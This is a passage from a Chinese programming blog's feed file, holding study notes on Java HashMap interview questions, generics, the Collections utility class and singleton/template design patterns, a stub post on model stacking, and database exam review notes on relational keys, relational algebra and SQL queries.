因为这样可以使得hashCode的高16位信息也能参与到运算中来</p></blockquote><p>9、HashMap的数组长度为什么一定要是2的幂次方</p><blockquote><p>答：因为2的n次方-1的二进制值是前面都0，后面几位都是1，这样的话，与hash进行&amp;运算的结果就能保证在[0,table.length-1]范围内，而且是均匀的。</p></blockquote><p>10、HashMap 为什么使用 &amp;按位与运算代替%模运算？</p><blockquote><p>答：因为&amp;效率高</p></blockquote><p>11、HashMap的数组什么时候扩容？</p><blockquote><p>答：JDK1.7版：当要添加新Entry对象时发现（1）size达到threshold（2）table[index]!=null时，两个条件同时满足会扩容</p><p>JDK1.8版：当要添加新Entry对象时发现（1）size达到threshold（2）当table[index]下的结点个数达到8个但是table.length又没有达到64。两种情况满足其一都会导致数组扩容</p><p>而且数组一旦扩容，不管哪个版本，都会导致所有映射关系重新调整存储位置。</p></blockquote><p>12、如何计算扩容阈值(临界值)？</p><blockquote><p>答：threshold = capacity * loadfactor</p></blockquote><p>13、loadFactor为什么是0.75，如果是1或者0.1呢有什么不同？</p><blockquote><p>答：1的话，会导致某个table[index]下面的结点个数可能很长</p><p>0.1的话，会导致数组扩容的频率太高</p></blockquote><p>14、JDK1.8的HashMap什么时候树化？</p><blockquote><p>答：当table[index]下的结点个数达到8个但是table.length已经达到64</p></blockquote><p>15、JDK1.8的HashMap什么时候反树化？</p><blockquote><p>答：当table[index]下的树结点个数少于6个</p></blockquote><p>16、JDK1.8的HashMap为什么要树化？</p><blockquote><p>答：因为当table[index]下的结点个数超过8个后，查询效率就低下了，修改为红黑树的话，可以提高查询效率</p></blockquote><p>17、JDK1.8的HashMap为什么要反树化？</p><blockquote><p>答：因为因为当table[index]下树的结点个数少于6个后，使用红黑树反而过于复杂了，此时使用链表既简洁又效率也不错</p></blockquote><p>18、作为HashMap的key类型重写equals和hashCode方法有什么要求</p><p>​    （1）equals与hashCode一起重写</p><p>​    （2）重写equals()方法，但是有一些注意事项；</p><ul><li>自反性：x.equals(x)必须返回true。<br>对称性：x.equals(y)与y.equals(x)的返回值必须相等。<br>传递性：x.equals(y)为true，y.equals(z)也为true，那么x.equals(z)必须为true。<br>一致性：如果对象x和y在equals()中使用的信息都没有改变，那么x.equals(y)值始终不变。<br>非null：x不是null，y为null，则x.equals(y)必须为false。</li></ul><p>​    （3）重写hashCode（）的注意事项</p><ul><li>如果equals返回true的两个对象，那么hashCode值一定相同，并且只要参与equals判断属性没有修改，hashCode值也不能修改；<br>如果equals返回false的两个对象，那么hashCode值可以相同也可以不同；<br>如果hashCode值不同的，equals一定要返回false；<br>hashCode不宜过简单，太简单会导致冲突严重，hashCode也不宜过于复杂，会导致性能低下；</li></ul><p>19、为什么大部分 hashcode 方法使用 31？</p><blockquote><p> 答：因为31是一个不大不小的素数</p></blockquote><p>20、请问已经存储到HashMap中的key的对象属性是否可以修改？为什么？</p><blockquote><p>答：如果该属性参与hashCode的计算，那么不要修改。因为一旦修改hashCode()已经不是原来的值。<br>而存储到HashMap中时，key的hashCode()–&gt;hash()–&gt;hash已经确定了，不会重新计算。用新的hashCode值再查询get(key)/删除remove(key)时，算的hash值与原来不一样就不找不到原来的映射关系了。</p></blockquote><p>21、所以为什么，我们实际开发中，key的类型一般用String和Integer</p><blockquote><p>答：因为他们不可变。</p></blockquote><p>22、为什么HashMap中的Node或Entry类型的hash变量与key变量加final声明？</p><blockquote><p> 答：因为不希望你修改hash和key值</p></blockquote><p>23、为什么HashMap中的Node或Entry类型要单独存储hash？</p><blockquote><p> 答：为了在添加、删除、查找过程中，比较hash效率更高，不用每次重新计算key的hash值</p></blockquote><p>24、请问已经存储到HashMap中的value的对象属性是否可以修改？为什么？</p><blockquote><p>答：可以。因为我们存储、删除等都是根据key，和value无关。</p></blockquote><p>25、如果key是null是如何存储的？</p><blockquote><p>答：会存在table[0]中</p></blockquote><h2 id="12-7-集合框架图"><a href="#12-7-集合框架图" class="headerlink" title="12.7 集合框架图"></a>12.7 集合框架图</h2><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="imgs/1560348912361.png" alt="1560348912361" title>                </div>                <div class="image-caption">1560348912361</div>            </figure><h1 id="第13章-泛型"><a href="#第13章-泛型" class="headerlink" title="第13章 泛型"></a>第13章 泛型</h1><h2 id="13-1-泛型的概述"><a href="#13-1-泛型的概述" class="headerlink" title="13.1 泛型的概述"></a>13.1 泛型的概述</h2><p>泛型：参数化类型</p><p>类型形参：<t>，<e>，<k>，<v>，<u>，<r>。。。。</r></u></v></k></e></t></p><p>类型实参：必须是引用数据类型，不能是基本数据类型</p><p>​    <string>，<integer>，<student>，&lt;ArrayList<string>&gt;。。。</string></student></integer></string></p><h2 id="13-2-形式一：泛型类与泛型接口"><a href="#13-2-形式一：泛型类与泛型接口" class="headerlink" title="13.2 形式一：泛型类与泛型接口"></a>13.2 形式一：泛型类与泛型接口</h2><p>1、声明语法格式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">【修饰符】 class 类名/接口&lt;类型形参列表&gt;&#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">【修饰符】 class 类名/接口&lt;类型形参1 extends 父类上限&gt;&#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line">【修饰符】 class 类名/接口&lt;类型形参1 extends 父类上限 &amp; 父接口上限&gt;&#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>在类名或接口名后面声明的泛型形参类型，可以在当前类或接口中使用，用作声明成员变量、方法的形参、方法的返回值。</p><p>但是不能用于<strong>静态成员</strong>上</p></blockquote><p>2、使用语法格式</p><p>在（1）创建泛型类、泛型接口的对象时，为泛型形参指定具体类型</p><p>​    （2）在继承泛型类或实现泛型接口时，为泛型形参指定具体类型</p><p>示例代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">ArrayList&lt;String&gt; list = <span class="keyword">new</span> ArrayList&lt;String&gt;();</span><br><span class="line"></span><br><span class="line">ArrayList&lt;String&gt; list = <span class="keyword">new</span> ArrayList&lt;&gt;();<span class="comment">//JDK1.7之后可以省略</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyStringArrayList</span> <span class="keyword">extends</span> <span class="title">ArrayList</span>&lt;<span class="title">String</span>&gt;</span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Employee</span> <span class="keyword">implements</span> <span class="title">Comparable</span>&lt;<span class="title">Employee</span>&gt;</span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compareTo</span><span class="params">(Employee e)</span></span>&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Arrays.sort(数组,  <span class="keyword">new</span>  Comparator&lt;泛型实参&gt;()&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(泛型实参类型  o1, 泛型实参类型  o2)</span></span>&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>3、泛型如果没有指定，会被擦除，按照最左边的上限处理，如果没有指定上限，按照Object处理</p><h2 id="13-3-形式二：泛型方法"><a href="#13-3-形式二：泛型方法" class="headerlink" title="13.3 形式二：泛型方法"></a>13.3 形式二：泛型方法</h2><p>1、声明的语法格式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">【修饰符】 &lt;泛型形参列表&gt;  返回值类型  方法名(【数据形参列表】)【throws 异常列表】&#123;&#125;</span><br><span class="line">【修饰符】 &lt;泛型形参 extends 父类上限 &amp; 父接口上限&gt;  返回值类型  方法名(【数据形参列表】)【throws 异常列表】&#123;&#125;</span><br></pre></td></tr></table></figure><blockquote><p>（1）在方法返回值类型前面声明的泛型形参类型，只能在当前方法中使用，用于表示形参的类型或返回值类型，或方法局部变量的类型，和别的方法无关。</p><p>（2）泛型方法可以是静态方法，也可以是非静态方法</p></blockquote><p>2、 使用</p><p>当调用方法，会根据具体的数据的实参的类型，来确定泛型实参的类型。</p><h2 id="13-4-通配符？"><a href="#13-4-通配符？" class="headerlink" title="13.4 通配符？"></a>13.4 通配符？</h2><p>（1）?：代表任意引用数据类型</p><p>（2）?  extends 上限：代表上限本身或它的子类</p><p>（3）? super 下限：代表下限本身或它的父类</p><p>例如：</p><p>ArrayList&lt;?&gt;：表示可以接受任意类型</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ArrayList&lt;?&gt; list = <span class="keyword">new</span> ArrayList&lt;String&gt;();</span><br><span class="line">ArrayList&lt;?&gt; list = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line">ArrayList&lt;?&gt; list = <span class="keyword">new</span> ArrayList&lt;Animal&gt;();</span><br></pre></td></tr></table></figure><p>ArrayList&lt;? extends 上限&gt;：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ArrayList&lt;? extends Person&gt; list = new ArrayList&lt;Person&gt;();</span><br><span class="line">ArrayList&lt;? extends Person&gt; list = new ArrayList&lt;Animal&gt;();//Animal不行，因为Animal是父类</span><br><span class="line">ArrayList&lt;? extends Person&gt; list = new ArrayList&lt;Student&gt;();</span><br><span class="line">ArrayList&lt;? extends Person&gt; list = new ArrayList&lt;Dog&gt;();//Dog也不行</span><br></pre></td></tr></table></figure><p>ArrayList&lt;? super 下限&gt;：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ArrayList&lt;? <span class="keyword">super</span> Person&gt; list = <span class="keyword">new</span> ArrayList&lt;Person&gt;();</span><br><span class="line">ArrayList&lt;? <span class="keyword">super</span> Person&gt; list = <span class="keyword">new</span> ArrayList&lt;Animal&gt;();</span><br><span class="line">ArrayList&lt;? <span class="keyword">super</span> Person&gt; list = <span class="keyword">new</span> ArrayList&lt;Student&gt;();<span class="comment">//Student，因为Student是子类</span></span><br><span class="line">ArrayList&lt;? <span class="keyword">super</span> Person&gt; list = <span class="keyword">new</span> ArrayList&lt;Dog&gt;();<span class="comment">//Dog也不行</span></span><br></pre></td></tr></table></figure><blockquote><p>ArrayList&lt;?&gt;：不能添加元素，除了null</p><p>ArrayList&lt;? extends 上限&gt;：不能添加元素，除了null</p><p>ArrayList&lt;? super 下限&gt;：可以添加下限或下限子类的对象</p></blockquote><h2 id="13-5-Collections工具类"><a href="#13-5-Collections工具类" class="headerlink" title="13.5 Collections工具类"></a>13.5 Collections工具类</h2><p>java.util.Collections：工具类，操作集合</p><p>（1）public static <t> boolean addAll(Collection&lt;? super T&gt; c, T… elements)</t></p><p>添加elements的几个对象到c集合中。T是elements对象的类型，要求Collection集合的元素类型必须是T或T的父类</p><p>（2）public static <t> int binarySearch(List&lt;? extends Comparable&lt;? super T&gt;&gt; list,T key)  </t></p><p>在list集合中用二分查找key的下标，如果存在返回的是合理的下标，如果不存在返回的是一个负数下标   </p><p>T是元素的类型，</p><? extends Comparable<? super T>>，要求集合的元素必须实现Comparable接口<? super T>，在实现Comparable接口，可以指定Comparable<类型实参>为T或T的父类。（3）public static boolean disjoint(Collection<?><p> c1, Collection&lt;?&gt; c2)</p><p>判断c1和c2没有交集就为true</p><p>（4）public static &lt;T extends Object &amp; Comparable&lt;? super T&gt;&gt; T max(Collection&lt;? extends T&gt; coll)</p><p>求coll集合中最大元素</p><p>&lt;T extends Object &amp; Comparable&lt;? super T&gt;&gt;：要求T或T的父类实现Comparable接口</p><p>因为找最大值需要比较大小</p><p>（5）public static &lt;T extends Comparable&lt;? super T&gt;&gt; void sort(List<t> list) 给list集合排序   </t></p><p>&lt;T extends Comparable&lt;? super T&gt;&gt;：要求T或T的父类实现Comparable接口</p><p>（6）public static <t> Collection<t> synchronizedCollection(Collection<t> c)</t></t></t></p><p>以synchronizedXX开头的方法，表示把某种非线程安全集合转为一个线程安全的集合。</p><p>（7）public static <t> List<t> unmodifiableList(List&lt;? extends T&gt; list)</t></t></p><p>以unmodifiableXx开头的方法，表示返回一个“只读”的集合。</p><h1 id="第十八章-设计模式"><a href="#第十八章-设计模式" class="headerlink" title="第十八章 设计模式"></a>第十八章 设计模式</h1><h2 id="18-1-模板设计模式（了解）"><a href="#18-1-模板设计模式（了解）" class="headerlink" title="18.1 模板设计模式（了解）"></a>18.1 模板设计模式（了解）</h2><p>1、当解决某个问题，或者完成某个功能时，主体的算法结构（步骤）是确定的，只是其中的一个或者几个小的步骤不确定，要有使用者（子类）来确定时，就可以使用模板设计模式</p><p>2、示例代码：计算任意一段代码的运行时间</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//模板类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">CalTime</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">getTime</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="comment">//1、获取开始时间</span></span><br><span class="line">        <span class="keyword">long</span> start =  System.currentTimeMills();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//2、运行xx代码：这个是不确定的</span></span><br><span class="line">        doWork();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//3、获取结束时间</span></span><br><span class="line">        <span class="keyword">long</span> end =  System.currentTimeMills();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//4、计算时间差</span></span><br><span class="line">        <span class="keyword">return</span> end - start;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">doWork</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用模板类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyCalTime</span> <span class="keyword">extends</span> <span class="title">CalTime</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doWork</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="comment">//....需要计算运行时间的代码</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        MyCalTime my = <span class="keyword">new</span> MyCalTime();</span><br><span class="line">        System.out.println(<span class="string">"运行时间："</span> + my.getTime());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="18-2-单例设计模式"><a href="#18-2-单例设计模式" class="headerlink" title="18.2 单例设计模式"></a>18.2 单例设计模式</h2><p>单例：整个系统中，某个类型的对象只有一个。</p><p>1、饿汉式</p><p>（1）枚举式</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">enum</span> Single&#123;</span><br><span class="line">    INSTANCE</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>（2）形式二</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Single</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Single INSTANCE = <span class="keyword">new</span> Single();</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Single</span><span class="params">()</span></span>&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>（3）形式三</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Single</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Single INSTANCE = <span class="keyword">new</span> Single();</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Single</span><span class="params">()</span></span>&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Single <span class="title">getInstance</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> INSTANCE;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2、懒汉式</p><p>（1）内部类形式</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Single</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Single</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Inner</span></span>&#123;</span><br><span class="line">        <span class="keyword">static</span> <span class="keyword">final</span> Single INSTANCE = <span class="keyword">new</span> Single();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Single <span class="title">getInstance</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Inner.INSTANCE;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>（2）形式二</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Single</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Single instance;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Single</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Single <span class="title">getInstance</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(instance == <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">synchronized</span>(Single.class)&#123;</span><br><span class="line">                <span class="keyword">if</span>(instance == <span class="keyword">null</span>)&#123;</span><br><span class="line">                    instance = <span class="keyword">new</span> Single();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></类型实参>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>模型集成策略</title>
      <link href="/2021/01/12/2021-01-12-%E6%A8%A1%E5%9E%8B%E9%9B%86%E6%88%90/"/>
      <url>/2021/01/12/2021-01-12-%E6%A8%A1%E5%9E%8B%E9%9B%86%E6%88%90/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h2 id="stacking"><a href="#stacking" class="headerlink" title="stacking"></a>stacking</h2>]]></content>
      
      
      <categories>
          
          <category> ML </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ML </tag>
            
            <tag> DL </tag>
            
            <tag> stacking </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据库系统相关</title>
      <link href="/2021/01/11/2021-01-11-%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
      <url>/2021/01/11/2021-01-11-%E6%95%B0%E6%8D%AE%E5%BA%93/</url>
      
        <content type="html"><![CDATA[<p>关于计算机研究生复试的数据库相关问题（笔试）</p><a id="more"></a><h2 id="系统概念相关"><a href="#系统概念相关" class="headerlink" title="系统概念相关"></a>系统概念相关</h2><p>数据视图<br>数据抽象： 物理层–&gt;逻辑层–&gt;视图层<br>实例和模式：物理模式–&gt;逻辑模式–&gt;子模式<br>数据集合是实例(Instance)， 数据库总体设计为数据库模式(Schema)<br>数据模型： 关系模型  实体-联系模型（E-R)  基于对象的模型  半结构化数据模型</p><h2 id="关系运算"><a href="#关系运算" class="headerlink" title="关系运算"></a>关系运算</h2><p>域：关系中的某属性允许取值的集合<br><strong>码</strong>：整个关系中区分不同元组的一种性质<br>超码 super key：一个或多个属性的集合，唯一标识一个元组,允许有多余的属性<br>候选码 candidate key：允许最少必要属性的超码即候选码比如{ID}{name,seat}是两个候选码<br>主码 primary key：设计者在一个关系内的候选码中选择的区分元组的属性组合<br>主码选择原则：选择那些值从不改变或极少改变的候选码作primary key<br>外码 foreign key：一个关系内的某属性是另一个关系的主码</p><p><strong>关系代数</strong></p><ul><li>选择元组/属性 σ</li><li>投影 π</li><li>自然连接 ∞</li><li>笛卡尔积 X</li><li>集合运算 交 并</li></ul><h2 id="自然连接举例"><a href="#自然连接举例" class="headerlink" title="自然连接举例"></a>自然连接举例</h2><table><thead><tr><th align="center">A</th><th align="center">B</th><th align="center">C</th><th></th><th align="center">D</th><th align="center">B</th><th align="center">E</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">a</td><td align="center">3</td><td></td><td align="center">2</td><td align="center">c</td><td align="center">7</td></tr><tr><td align="center">2</td><td align="center">b</td><td align="center">6</td><td></td><td align="center">3</td><td align="center">d</td><td align="center">5</td></tr><tr><td align="center">3</td><td align="center">c</td><td align="center">7</td><td></td><td align="center">1</td><td align="center">a</td><td align="center">3</td></tr><tr><td align="center">* 计算笛卡尔积</td><td align="center"></td><td align="center"></td><td></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">* 选出左B=右B的元组，不等的不算，忽略掉</td><td align="center"></td><td align="center"></td><td></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">* 合并该元组，成为新元组 A B C D E ，成为新元组的只有两组</td><td align="center"></td><td align="center"></td><td></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">1</td><td align="center">a</td><td align="center">3</td><td>1</td><td align="center">3</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">3</td><td align="center">c</td><td align="center">7</td><td>2</td><td align="center">7</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">## SQL相关</td><td align="center"></td><td align="center"></td><td></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">自然连接 nature join 和join using(某个属性)</td><td align="center"></td><td align="center"></td><td></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">并运算：union 自动去重 union all 可以保留重复</td><td align="center"></td><td align="center"></td><td></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">交运算：intersect 自动去重 intersect all 可保留重复</td><td align="center"></td><td align="center"></td><td></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">差运算：except 自动去重 except all 可保留重复</td><td align="center"></td><td align="center"></td><td></td><td align="center"></td><td align="center"></td><td align="center"></td></tr></tbody></table><p>聚集函数：sum, min , max , count , avg<br>分组聚集： group by中没有出现的属性，只要是出现在select中，必须在聚集函数内部的形式出现,比如b,c没出现在group by 内部，用例：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> a,<span class="keyword">avg</span>(b),<span class="keyword">sum</span>(c) <span class="keyword">from</span> table1 <span class="keyword">group</span> <span class="keyword">by</span> a;</span><br></pre></td></tr></table></figure><p>集合成员资格：in ,not in<br>集合比较：some运算,用例</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">ID</span> <span class="keyword">from</span> instructor </span><br><span class="line"><span class="keyword">where</span> salary &gt;<span class="keyword">some</span> (<span class="keyword">select</span> salary <span class="keyword">from</span> instructor </span><br><span class="line">    <span class="keyword">where</span> department = <span class="string">'bio'</span>);</span><br><span class="line">等价于</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">distinct</span> T.ID <span class="keyword">from</span> instructor <span class="keyword">as</span> T,instructor <span class="keyword">as</span> S </span><br><span class="line"><span class="keyword">where</span> S.department =<span class="string">'bio'</span> <span class="keyword">and</span> T.salary &gt;S.salary;</span><br></pre></td></tr></table></figure><p>空关系测试：exists, not exists,测试子查询结果中是否存在元组，用例：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">DSC黑书第六版中的，“找出选修了bio系开设的所有课程的学生”（表在官网</span><br><span class="line"><span class="keyword">select</span> S.ID,S.name <span class="keyword">from</span> student <span class="keyword">as</span> S </span><br><span class="line"><span class="keyword">where</span> <span class="keyword">not</span> <span class="keyword">exists</span>( (<span class="keyword">select</span> course_id <span class="keyword">from</span> course</span><br><span class="line">   <span class="keyword">where</span> dep_name = <span class="string">'bio'</span>)//找出bio系开设的所有课程</span><br><span class="line">   <span class="keyword">except</span></span><br><span class="line">       (<span class="keyword">select</span> T.course_id <span class="keyword">from</span> takes <span class="keyword">as</span> T</span><br><span class="line">   <span class="keyword">where</span> S.ID = T.ID) );//找出S.ID选修的所有课程</span><br></pre></td></tr></table></figure><p>重复元组存在性测试：unique，测试子查询返回集合是否有重复元组，无则返回true；not unique则相反</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">DSC黑书第六版中的，“找出所有在2019年最多开设一次的课程”</span><br><span class="line"><span class="keyword">select</span> C.course_id <span class="keyword">from</span> course <span class="keyword">as</span> C</span><br><span class="line"><span class="keyword">where</span> <span class="keyword">unique</span> (<span class="keyword">select</span> S.course_id <span class="keyword">from</span> <span class="keyword">section</span> <span class="keyword">as</span> S</span><br><span class="line">      <span class="keyword">where</span> C.course_id =S.course_id  <span class="keyword">and</span> S.year =<span class="number">2019</span>);</span><br></pre></td></tr></table></figure><p>标量子查询：子查询只返回包括【单个属性】的【单个元组】，只可以出现在select where having三种子句中</p><h2 id="关系代数"><a href="#关系代数" class="headerlink" title="关系代数"></a>关系代数</h2>]]></content>
      
      
      <categories>
          
          <category> 其他 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>统计学习笔记</title>
      <link href="/2020/09/11/2020-09-12-statics_note/"/>
